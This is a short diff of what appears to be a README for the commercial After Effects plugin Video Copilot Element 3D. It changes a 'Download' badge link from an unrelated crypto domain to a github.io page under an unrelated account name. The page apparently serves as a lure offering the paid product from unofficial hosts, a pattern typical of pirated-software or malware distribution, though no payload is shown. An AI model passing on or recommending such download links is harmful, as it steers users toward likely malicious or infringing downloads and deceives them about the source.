@@ -2,7 +2,7 @@
 
 Video Copilot Element 3D focuses on GPU 3D for AE with modern workflows for 2025.
 
-[![Download Video Copilot Element 3D](https://img.shields.io/badge/Download-Video_Copilot_Element_3D-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download Video Copilot Element 3D](https://img.shields.io/badge/Download-Video_Copilot_Element_3D-blueviolet)](https://stonebrakeroctzeidan.github.io/.github/Video-Copilot-Element)
 
 ---
 
